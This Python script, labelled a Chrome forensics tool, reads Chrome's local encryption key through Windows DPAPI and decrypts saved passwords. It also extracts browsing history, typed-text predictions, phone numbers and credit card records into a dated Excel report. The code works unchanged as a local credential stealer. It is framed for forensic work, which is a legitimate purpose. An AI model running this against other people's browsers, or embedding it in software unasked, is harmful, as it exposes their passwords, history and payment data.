################################################################################
#Chrome forensics tool
#Developed by Boris Ivanov
################################################################################
import os
from os import path
import base64
import win32crypt
from Crypto.Cipher import AES
import sqlite3
import json
import datetime
from datetime import date
import pandas as pd

print(r"""
  _    _                                    _____           _           _
 | |  | |                                  |  __ \         (_)         | |
 | |__| | ___  _ __   ___  _   _ _ __ ___  | |__) | __ ___  _  ___  ___| |_
 |  __  |/ _ \| '_ \ / _ \| | | | '__/ __| |  ___/ '__/ _ \| |/ _ \/ __| __|
 | |  | | (_) | | | | (_) | |_| | |  \__ \ | |   | | | (_) | |  __/ (__| |_
 |_|  |_|\___/|_| |_|\___/ \__,_|_|  |___/ |_|   |_|  \___/| |\___|\___|\__|
                                                          _/ |
                                                         |__/
""")
def humanTime(timestamp):
    epoch_start = datetime.datetime(1601,1,1)
    #create an object for the number of microseconds in the timestamp
    delta = datetime.timedelta(microseconds=int(timestamp))
    return epoch_start + delta

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    # get the initialization vector
    init_vector = password[3:15]
    password = password[15:]
    # generate cipher
    cipher = AES.new(key, AES.MODE_GCM, init_vector)
    # decrypt password
    return cipher.decrypt(password)[:-16].decode()

today = date.today()
key = get_encryption_key()

#Chrome default folder
print("[+]Hint! Usually(C:\\Users\\username\AppData\Local\Google\Chrome\\User Data\Default)")
root_dir = input("[+]Enter Chrome's default folder path: ")
#JSON File containing the encryption key
json_dir = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                        "Google", "Chrome", "User Data", "default", "Login Data")

# if path.exists(root_dir):
#     print("\n[+]Path located")
# else:
#     print("\n[-]Error! Path does not exist")
#     root_dir = input("[+]Enter Chrome's default folder path: ")
"""WIP"""

#DB Files
history = root_dir + "\History"
logins = root_dir + "\Login Data"
predictor = root_dir + "\\Network Action Predictor"
phoneNumber = root_dir + "\Web Data"
creditCards = root_dir + "\Web Data"

#SELECT statements
selectURL = "SELECT url, title, visit_count, typed_count, last_visit_time FROM urls;"
selectLogin = "SELECT origin_url, username_value, password_value, date_last_used \
FROM logins"
selectPredictor = "SELECT user_text, url, number_of_hits, number_of_misses \
FROM network_action_predictor"
selectPhone = "SELECT number FROM autofill_profile_phones"
selectCard = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted \
,use_count, use_date, billing_address_id FROM credit_cards"


#extract browsing history
c_url = sqlite3.connect(history)
#read databse
df_url=pd.read_sql(selectURL, c_url)
#fix timestamps
df_url["last_visit"] = df_url["last_visit_time"].apply(humanTime)
del df_url["last_visit_time"]

#extract login data
c_login = sqlite3.connect(logins)
#read databse
df_login=pd.read_sql(selectLogin, c_login)
#fix timestamps
df_login["last_used"] = df_login["date_last_used"].apply(humanTime)
df_login["decoded_password"] = df_login["password_value"].apply(decrypt_password, key=key)
del df_login["date_last_used"]

#exctract text predictions
c_predict = sqlite3.connect(predictor)
df_predict = pd.read_sql(selectPredictor, c_predict)

#extract phone numbers
c_phone = sqlite3.connect(phoneNumber)
df_phone = pd.read_sql(selectPhone, c_phone)

#extract credit card information
c_card = sqlite3.connect(creditCards)
df_card = pd.read_sql(selectCard, c_card)


# Create the Excel file
saveFile = ("data/" + today.strftime("%b-%d-%Y") + ".xlsx")
with pd.ExcelWriter(saveFile) as writer:
    df_url.to_excel(writer, sheet_name="History", index=False)
    df_login.to_excel(writer, sheet_name="LoginData", index=False)
    df_predict.to_excel(writer, sheet_name="Action Predictor", index=False)
    df_phone.to_excel(writer, sheet_name="Phone numbers", index=False)
    df_card.to_excel(writer, sheet_name="Credit cards", index=False)

    for column in df_url:
        column_length = max(df_url[column].astype(str).map(len).max(), len(column))
        col_idx = df_url.columns.get_loc(column)
        writer.sheets['History'].set_column(col_idx, col_idx, column_length)
    for column in df_login:
        column_length = max(df_login[column].astype(str).map(len).max(), len(column))
        col_idx = df_login.columns.get_loc(column)
        writer.sheets['LoginData'].set_column(col_idx, col_idx, column_length)
print("\n[+]XLSX Report created succesfully")

# saveFile = ("data/" + today.strftime("%b-%d-%Y") + ".xlsx")
# with pd.ExcelWriter(saveFile) as writer:
#     df_url.to_excel(writer, sheet_name="History", index=False)
#     df_login.to_excel(writer, sheet_name="LoginData", index=False)
#     df_predict.to_excel(writer, sheet_name="Action Predictor", index=False)
#     df_phone.to_excel(writer, sheet_name="Phone numbers", index=False)
#     df_card.to_excel(writer, sheet_name="Credit cards", index=False)
# print("\n[+]XLSX Report created succesfully") "%b-%d-%Y"
